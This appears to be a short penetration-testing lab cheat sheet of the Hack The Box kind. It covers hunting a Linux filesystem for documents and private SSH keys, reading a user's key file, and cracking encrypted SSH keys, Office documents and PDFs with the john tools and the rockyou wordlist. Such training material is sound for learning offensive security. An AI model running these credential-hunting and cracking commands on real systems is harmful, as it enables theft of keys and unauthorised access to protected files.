## Hunting for Encrypted Files

```shell
3kjS@htb[/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
## Hunting for SSH keys

```shell
3kjS@htb[/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

3kjS@htb[/htb]$ cat /home/jsmith/.ssh/SSH.private

3kjS@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_ed25519

3kjS@htb[/htb]$ ssh-keygen -yf ~/.ssh/id_rsa
```
## Cracking encrypted SSH keys

```shell
3kjS@htb[/htb]$ ssh2john.py SSH.private > ssh.hash 
3kjS@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
```

```shell
3kjS@htb[/htb]$ john ssh.hash --show 
SSH.private:1234 
1 password hash cracked, 0 left
```
## Cracking password-protected documents

```shell
3kjS@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash 
3kjS@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash 
3kjS@htb[/htb]$ john protected-docx.hash --show
```

The process for cracking PDF files is quite similar, as we simply swap out `office2john.py` for `pdf2john.py`.

```shell
3kjS@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash 
3kjS@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash 
3kjS@htb[/htb]$ john pdf.hash --show 

PDF.pdf:1234 

1 password hash cracked, 0 left
```
